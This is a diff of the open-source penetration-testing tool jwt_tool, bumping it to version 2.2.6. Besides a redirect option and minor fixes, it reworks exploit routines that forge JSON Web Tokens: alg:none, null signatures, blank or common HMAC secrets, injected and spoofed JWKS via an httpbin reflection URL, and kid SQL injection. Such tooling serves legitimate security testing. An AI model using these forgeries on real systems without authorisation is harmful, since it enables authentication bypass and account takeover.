@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 #
-# JWT_Tool version 2.2.5 (26_01_2022)
+# JWT_Tool version 2.2.6 (09_09_2022)
 # Written by Andy Tyler (@ticarpi)
 # Please use responsibly...
 # Software URL: https://github.com/ticarpi/jwt_tool
 # Web: https://www.ticarpi.com
 # Twitter: @ticarpi
 
-jwttoolvers = "2.2.5"
+jwttoolvers = "2.2.6"
 import ssl
 import sys
 import os
@@ -61,6 +61,16 @@ def createConfig():
     ecprivKeyName = path+"/jwttool_custom_private_EC.pem"
     ecpubkeyName = path+"/jwttool_custom_public_EC.pem"
     jwksName = path+"/jwttool_custom_jwks.json"
+    proxyHost = "127.0.0.1"
+    config = configparser.ConfigParser(allow_no_value=True)
+    config.optionxform = str
+    config['crypto'] = {'pubkey': pubkeyName,
+        'privkey': privKeyName,
+        'ecpubkey': ecpubkeyName,
+        'ecprivkey': ecprivKeyName,
+        'jwks': jwksName}
+    config['customising'] = {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) jwt_tool',
+        'jwks_kid': 'jwt_tool'}
     if (os.path.isfile(privKeyName)) and (os.path.isfile(pubkeyName)) and (os.path.isfile(ecprivKeyName)) and (os.path.isfile(ecpubkeyName)) and (os.path.isfile(jwksName)):
         cprintc("Found existing Public and Private Keys - using these...", "cyan")
         origjwks = open(jwksName, "r").read()
@@ -88,22 +98,14 @@ def createConfig():
         fulljwks = json.dumps(jwksout,separators=(",",":"), indent=4)
         with open(jwksName, 'w') as test_jwks_out:
                 test_jwks_out.write(fulljwks)
-        jwks_b64 = base64.b64encode(fulljwks.encode('ascii'))
-    proxyHost = "127.0.0.1"
-    config = configparser.ConfigParser(allow_no_value=True)
-    config.optionxform = str
-    config['crypto'] = {'pubkey': pubkeyName,
-        'privkey': privKeyName,
-        'ecpubkey': ecpubkeyName,
-        'ecprivkey': ecprivKeyName,
-        'jwks': jwksName}
+        jwks_b64 = base64.urlsafe_b64encode(fulljwks.encode('ascii'))
     config['services'] = {'jwt_tool_version': jwttoolvers,
         '# To disable the proxy option set this value to: False (no quotes). For Docker installations with a Windows host OS set this to: "host.docker.internal:8080"': None, 'proxy': proxyHost+':8080',
+        '# To disable following redirects set this value to: False (no quotes)': None, 'redir': 'True',
         '# Set this to the URL you are hosting your custom JWKS file (jwttool_custom_jwks.json) - your own server, or maybe use this cheeky reflective URL (https://httpbin.org/base64/{base64-encoded_JWKS_here})': None,
-        'jwksloc': 'https://httpbin.org/base64/'+jwks_b64.decode(),
+        'jwksloc': '',
+        'jwksdynamic': 'https://httpbin.org/base64/'+jwks_b64.decode(),
         '# Set this to the base URL of a Collaborator server, somewhere you can read live logs, a Request Bin etc.': None, 'httplistener': ''}
-    config['customising'] = {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) jwt_tool',
-        'jwks_kid': 'jwt_tool'}
     config['input'] = {'wordlist': 'jwt-common.txt',
         'commonHeaders': 'common-headers.txt',
         'commonPayloads': 'common-payloads.txt'}
@@ -144,17 +146,21 @@ def sendToken(token, cookiedict, track, headertoken="", postdata=None):
             headerName, headerVal = eachHeader.split(":",1)
             headers[headerName] = headerVal.lstrip(" ")
     try:
+        if config['services']['redir'] == "True":
+            redirBool = True
+        else:
+            redirBool = False
         if config['services']['proxy'] == "False":
             if postdata:
-                response = requests.post(url, data=postdata, headers=headers, cookies=cookiedict, proxies=False, verify=False)
+                response = requests.post(url, data=postdata, headers=headers, cookies=cookiedict, proxies=False, verify=False, allow_redirects=redirBool)
             else:
-                response = requests.get(url, headers=headers, cookies=cookiedict, proxies=False, verify=False)
+                response = requests.get(url, headers=headers, cookies=cookiedict, proxies=False, verify=False, allow_redirects=redirBool)
         else:
             proxies = {'http': 'http://'+config['services']['proxy'], 'https': 'http://'+config['services']['proxy']}
             if postdata:
-                response = requests.post(url, data=postdata, headers=headers, cookies=cookiedict, proxies=proxies, verify=False)
+                response = requests.post(url, data=postdata, headers=headers, cookies=cookiedict, proxies=proxies, verify=False, allow_redirects=redirBool)
             else:
-                response = requests.get(url, headers=headers, cookies=cookiedict, proxies=proxies, verify=False)
+                response = requests.get(url, headers=headers, cookies=cookiedict, proxies=proxies, verify=False, allow_redirects=redirBool)
         if int(response.elapsed.total_seconds()) >= 9:
             cprintc("HTTP response took about 10 seconds or more - could be a sign of a bug or vulnerability", "cyan")
         return [response.status_code, len(response.content), response.content]
@@ -225,9 +231,9 @@ def jwtOut(token, fromMod, desc=""):
         except:
             cookiedict = {}
 
-        
 
-        # Check if token was included in substitution 
+
+        # Check if token was included in substitution
         if cookietoken[1] == 1 or headertoken[1] == 1 or posttoken[1]:
             resData = sendToken(token, cookiedict, logID, headertoken[0], posttoken[0])
         else:
@@ -528,7 +534,7 @@ def signingToken(newheadDict, newpaylDict):
 def checkSig(sig, contents, key):
     quiet = False
     if key == "":
-        cprintc("Type in the key to test", white)
+        cprintc("Type in the key to test", "white")
         key = input("> ")
     testKey(key.encode(), sig, contents, headDict, quiet)
 
@@ -671,7 +677,7 @@ def testKey(key, sig, contents, headDict, quiet):
             cprintc("[+] CORRECT key found:\n"+key.decode('UTF-8'), "green")
         else:
             cprintc("[+] "+key.decode('UTF-8')+" is the CORRECT key!", "green")
-        cprintc("You can tamper/fuzz the token contents (-T/-I) and sign it using:\npython3 jwt_tool.py [options here] -S "+str(headDict["alg"])+" -p \""+key.decode('UTF-8')+"\"", "cyan")
+        cprintc("You can tamper/fuzz the token contents (-T/-I) and sign it using:\npython3 jwt_tool.py [options here] -S "+str(headDict["alg"]).lower()+" -p \""+key.decode('UTF-8')+"\"", "cyan")
         return cracked
     else:
         cracked = False
@@ -717,7 +723,7 @@ def signTokenHS(headDict, paylDict, key, hashLength):
         newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newContents.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
     return newSig, newContents
 
-def buildJWKS(n, e, kid):                                       
+def buildJWKS(n, e, kid):
     newjwks = {}
     newjwks["kty"] = "RSA"
     newjwks["kid"] = kid
@@ -768,7 +774,7 @@ def jwksEmbed(newheadDict, newpaylDict):
     new_key = RSA.importKey(pubKey)
     n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
     e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
-    newjwks = buildJWKS(n, e, "jwt_tool")
+    newjwks = buildJWKS(n, e, config['customising']['jwks_kid'])
     newHead["jwk"] = newjwks
     newHead["alg"] = "RS256"
     key = privKey
@@ -1277,7 +1283,7 @@ def rejigToken(headDict, paylDict, sig):
                     cprintc("    [+] "+subclaim+" = null", "green")
                 elif headDict[claim][subclaim] == True:
                     cprintc("    [+] "+subclaim+" = true", "green")
-                elif headDict[claim][subclaim] == False: 
+                elif headDict[claim][subclaim] == False:
                     cprintc("    [+] "+subclaim+" = false", "green")
                 elif type(headDict[claim][subclaim]) == str:
                     cprintc("    [+] "+subclaim+" = \""+str(headDict[claim][subclaim])+"\"", "green")
@@ -1397,7 +1403,7 @@ def scanModePlaybook():
     newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
     jwtBlankPw = newContents+"."+newSig
     jwtOut(jwtBlankPw, "Exploit: Blank password accepted in signature (-X b)", "This token can exploit a hard-coded blank password in the config")
-    # Exploit: null signature      
+    # Exploit: null signature
     jwtNull = checkNullSig(contents)
     jwtOut(jwtNull, "Exploit: Null signature (-X n)", "This token was sent to check if a null signature can bypass checks")
     # Exploit: alg:none
@@ -1427,9 +1433,12 @@ def scanModePlaybook():
         origjku = headDict["jku"]
     except:
         origjku = False
-    jku = config['services']['jwksloc']
+        if config['services']['jwksloc']:
+            jku = config['services']['jwksloc']
+        else:
+            jku = config['services']['jwksdynamic']
     newContents, newSig = exportJWKS(jku)
-    jwtOut(newContents+"."+newSig, "Exploit: Spoof JWKS (-X s)", "Signed with JWKS at "+config['services']['jwksloc'])
+    jwtOut(newContents+"."+newSig, "Exploit: Spoof JWKS (-X s)", "Signed with JWKS at "+jku)
     if origjku:
         headDict["jku"] = origjku
     else:
@@ -1475,7 +1484,7 @@ def scanModePlaybook():
     key = "1"
     newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
     jwtOut(newContents+"."+newSig, "Injected kid claim - signed with secret = '1' from SQLi")
-    # kid testing... end  
+    # kid testing... end
     if origkid:
         headDict["kid"] = origkid
     else:
@@ -1492,7 +1501,7 @@ def scanModePlaybook():
     else:
         cprintc("External service interactions not tested - enter listener URL into 'jwtconf.ini' to try this option", "red")
     # Accept Common HMAC secret (as alterative signature)
-    with open(config['input']['wordlist']) as commonPassList:
+    with open(config['input']['wordlist'], "r", encoding='utf-8', errors='ignore') as commonPassList:
         commonPass = commonPassList.readline().rstrip()
         while commonPass:
             newSig, newContents = signTokenHS(headDict, paylDict, commonPass, 256)
@@ -1556,7 +1565,7 @@ def scanModeCommonClaims():
     injectCommonClaims(False)
     injectCommonClaims("jwt_tool")
     injectCommonClaims(0)
-    
+
     cprintc("Scanning mode completed: review the above results.\n", "magenta")
 
 def injectCommonClaims(contentVal):
@@ -1713,37 +1722,30 @@ def runExploits():
             for noneTok in zippedToks:
                 desc = "EXPLOIT: "+zippedToks[noneTok]+" - this is an exploit targeting the debug feature that allows a token to have no signature\n(This will only be valid on unpatched implementations of JWT.)"
                 jwtOut(noneTok, "Exploit: "+zippedToks[noneTok], desc)
-            # exit(1)
         elif args.exploit == "n":
             jwtNull = checkNullSig(contents)
             desc = "EXPLOIT: null signature\n(This will only be valid on unpatched implementations of JWT.)"
             jwtOut(jwtNull, "Exploit: Null signature", desc)
-            # exit(1)
         elif args.exploit == "b":
             key = ""
             newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
             jwtBlankPw = newContents+"."+newSig
             desc = "EXPLOIT: Blank password accepted in signature\n(This will only be valid on unpatched implementations of JWT.)"
             jwtOut(jwtBlankPw, "Exploit: Blank password accepted in signature", desc)
-            # exit(1)
         elif args.exploit == "i":
             newSig, newContents = jwksEmbed(headDict, paylDict)
             desc = "EXPLOIT: injected JWKS\n(This will only be valid on unpatched implementations of JWT.)"
             jwtOut(newContents+"."+newSig, "Injected JWKS", desc)
-            # exit(1)
         elif args.exploit == "s":
             if config['services']['jwksloc']:
                 jku = config['services']['jwksloc']
-                newContents, newSig = exportJWKS(jku)
-                if config['services']['jwksloc'] == args.jwksurl:
-                    cprintc("Paste this JWKS into a file at the following location before submitting token request: "+jku+"\n(JWKS file used: "+config['crypto']['jwks']+")\n"+str(config['crypto']['jwks'])+"", "cyan")
-                desc = "Signed with JWKS at "+config['services']['jwksloc']
-                jwtOut(newContents+"."+newSig, "Spoof JWKS", desc)          
-                # exit(1)
             else:
-                cprintc("No URL provided to spoof the JWKS (-u)\n", "red")
-                parser.print_usage()
-            # exit(1)
+                jku = config['services']['jwksdynamic']
+            newContents, newSig = exportJWKS(jku)
+            if config['services']['jwksloc'] and config['services']['jwksloc'] == args.jwksurl:
+                cprintc("Paste this JWKS into a file at the following location before submitting token request: "+jku+"\n(JWKS file used: "+config['crypto']['jwks']+")\n"+str(config['crypto']['jwks'])+"", "cyan")
+            desc = "Signed with JWKS at "+jku
+            jwtOut(newContents+"."+newSig, "Spoof JWKS", desc)
         elif args.exploit == "k":
             if config['crypto']['pubkey']:
                 newTok, newSig = checkPubKeyExploit(headDict, paylB64, config['crypto']['pubkey'])
@@ -1752,7 +1754,6 @@ def runExploits():
             else:
                 cprintc("No Public Key provided (-pk)\n", "red")
                 parser.print_usage()
-            # exit(1)
 
 def runActions():
     if args.tamper:
@@ -1837,6 +1838,8 @@ if __name__ == '__main__':
                         help="text string that appears in response for valid token (e.g. \"Welcome, ticarpi\")")
     parser.add_argument("-np", "--noproxy", action="store_true",
                         help="disable proxy for current request (change in jwtconf.ini if permanent)")
+    parser.add_argument("-nr", "--noredir", action="store_true",
+                        help="disable redirects for current request (change in jwtconf.ini if permanent)")
     parser.add_argument("-M", "--mode", action="store",
                         help="Scanning mode:\npb = playbook audit\ner = fuzz existing claims to force errors\ncc = fuzz common claims\nat - All Tests!")
     parser.add_argument("-X", "--exploit", action="store",
@@ -2030,6 +2033,9 @@ if __name__ == '__main__':
         config['argvals']['canaryvalue'] = args.canaryvalue
     if args.noproxy:
         config['services']['proxy'] = "False"
+    if args.noredir:
+        config['services']['redir'] = "False"
+
     if not args.crack and not args.exploit and not args.verify and not args.tamper and not args.injectclaims:
         rejigToken(headDict, paylDict, sig)
         if args.sign:
